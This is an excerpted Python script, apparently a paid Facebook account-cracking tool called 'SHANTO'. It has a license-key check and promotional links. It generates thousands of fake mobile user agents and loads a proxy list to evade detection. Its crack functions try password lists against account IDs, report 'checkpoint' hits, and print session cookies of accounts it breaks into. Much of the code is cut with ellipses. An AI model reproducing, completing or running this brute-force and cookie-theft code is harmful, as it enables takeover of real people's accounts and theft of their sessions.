...
def slow_text_appear(text, color, delay=0.05):
    for char in text:
        sys.stdout.write(f'\033[{color}m{char}')
        sys.stdout.flush()
        time.sleep(delay)
slow_text_appear('[+]', '92;1')
slow_text_appear(' Checking Update .?', '92;1', delay=0.05)
time.sleep(2)
os.system('clear')
slow_text_appear('[+]', '92;1')
slow_text_appear(' JOIN MY SCRIPT GIFT GROUP', '92;1', delay=0.05)
os.system(f'xdg-open https://facebook.com/grou648/')
time.sleep(6)
print("")
print("")
slow_text_appear('[+]', '93;1')
slow_text_appear(' FOLLOW MY GITHUB', '93;1', delay=0.05)
time.sleep(6)
os.system(f'xdg-open https://github.com/gazi443')
print("")
print("")
...
princp=[]
url = 'https://raw.githubusercontent.com/SHANTO2nd/XLM/main/prox.txt'
...
for ua in range(10000):
    aa='Mozilla/5.0 (Linux; Android 13; motorola edge 20 pro Build/T1RAS33.55-15-10-6; wv)'
    ...
    l='Mobile Safari/537.36 GSA/12.14.7.23.arm64'
...
for ua in range(10000):
    ...
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36 Puffin/'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(10):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-SzC'
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/gazimd443/APPROVED-KEY/blob/main/APPROVED-KEY-SHANTO.txt').text
        ua=open('bbnew.txt','w')
...
\033[1;36m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗ 
║ [●]  ᴀᴜᴛʜᴏʀ        :          SHANTO       ║ 
║ [●]  Ғαcɛвσσκ      :          SHANTO-TOOLS    ║    
║ [●]  ǤιτΗυβ        :          SHANTO-404-CYBER   ║   
║ [●]  ƬѲѲ˩Ƨ         :          ＰＡＩＤ      ║   
║ [●]  V̸E̸R̸S̸I̸O̸N̸       :           1.4          ║ 
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m"""
#-----------------[ Aproval ]-------------------#
def Subscraption():
    ...
    os.system('clear')
    print(logo)
    r1 = requests.get("https://github.com/gazimd443/APPROVED-KEY/blob/main/APPROVED-KEY-SHANTO.txt").text
    if id in r1:
        os.system('clear')
        print(logo)
    else:
        ...
        os.system('clear')
        print(logo)
        print("\033[1;39m[\033[1;32m●\033[1;39m] \033[1;32m15 Days 250 Taka \033[0;92m")
        print("\033[1;39m[\033[1;32m+\033[1;39m] \033[1;32m30 Days 500 Taka \033[0;92m")
        print("\033[1;39m[\033[1;32m●\033[1;39m]\033[1;33m SHANTO TooLs Daily Update)✅ \033[0;92m")
        ...
        input("\033[0;90m[\033[1;32m●\033[1;39m] \033[1;32mPress Enter To Send Key\033[0;92m")
        time.sleep(3.5)
        ...
        tks = f'https://wa.me/+8801607093107?text={message}'
...
os.system('clear')
print(logo)
os.system('espeak -a 300 " Your,   correct,  Name,"')
SHANTO =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m TYPE YOUR CORRECT NAME\033[1;91m: \33[1;32m')
os.system(f"espeak \"Hey.  ,{SHANTO} ,   , Welcome. ,To.     ,our.      ,Tools\"")
pass
...
def menu():
    os.system('clear')
    print(logo)
    print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m "+SHANTO)
    ...
    if SHANTO in ['111']:
        ...
        os.system('xdg-open https://wa.me/+8801607093107')
        os.system("python nono.py")
    elif SHANTO in ['3','03']:
        result()
    elif SHANTO in ['0']:
...
def passwrd():
    os.system('clear')
    print(logo)
    print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :    \033[1;43m\033[1;95m"+SHANTO)
    print("\033[1;40m\033[97;1m[\033[92;1m•\033[97;1m] \033[10;93mTODAY'S DATE : \033[1;91m\033[1;47m"+date)
    print('\033[1;40m\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mTOTAL IDz \033[0;97m:    \033[1;44m\033[1;37m',str(len(id)))
    print("\033[1;40m\033[97;1m[\033[92;1m•\033[97;1m] \x1b[38;5;208mSTARTED TIME\033[0;97m : \033[1;45m\033[1;97m"+time.strftime("%H:%M")+" "+ tag)
    print(f'\033[1;40m\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mUse Flight Mode For Speed Up ')
    print('\033[0;97m===============================================')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r{bo}[{SHANTO}-M1] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;90m[{SHANTO}-Cp] {idf} • {pw}')
                os.system(f"espeak \"{SHANTO}     ,Cp.    ,   id\"")
                ...
                print(f'\r\033[0;92m[{SHANTO}-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;96m{kuki} ')
                print('')
                os.system(f"espeak \"{SHANTO}     ,Ok.    ,   id\"")
...
def crackfree(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r{bo}[SHANTO-M2] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
